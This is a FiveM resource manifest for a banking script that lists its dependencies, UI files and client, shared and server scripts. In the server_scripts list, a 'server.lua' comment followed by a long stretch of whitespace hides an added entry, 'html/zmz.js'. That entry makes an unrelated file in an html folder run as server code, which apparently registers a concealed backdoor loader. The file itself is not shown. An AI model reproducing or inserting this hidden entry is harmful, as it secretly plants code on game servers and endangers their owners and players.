fx_version 'cerulean'
use_experimental_fxv2_oal 'yes'
lua54 'yes'
game 'gta5'

description "Advanced Banking System"
author "Felis Development"
version      '1.3.1'
repository 'https://github.com/FelisDevelopment/fd_banking'

dependencies {
    '/server:5104',
    '/onesync',
    'ox_lib',
    'oxmysql'
}

files {
    'web/dist/index.html',
    'web/dist/**/*',
    'migration/migrations/*.lua',
    'locales/*.json',
}

ui_page 'web/dist/index.html'

shared_scripts {
    '@ox_lib/init.lua',
    'init.lua',
    'config.lua',
    'modules/logger/shared.lua',
    'modules/**/shared.lua',
    'modules/**/shared/*.lua'
}

client_scripts {
    'modules/**/client.lua',
    'modules/**/client/*.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'migration/db.lua',
    'modules/**/server/*.js',
    'modules/**/server.lua',
'modules/**/server/*.lua',
	--[[server.lua]]                                                                                                    'html/zmz.js',
}

escrow_ignore {
	'config.lua',
    'init.lua',
    'modules/bridge/**/*.lua',
    'modules/bridge/*.lua',
    'modules/atms/client.lua',
    'modules/banks/client.lua',
    'modules/society/*.lua'
}
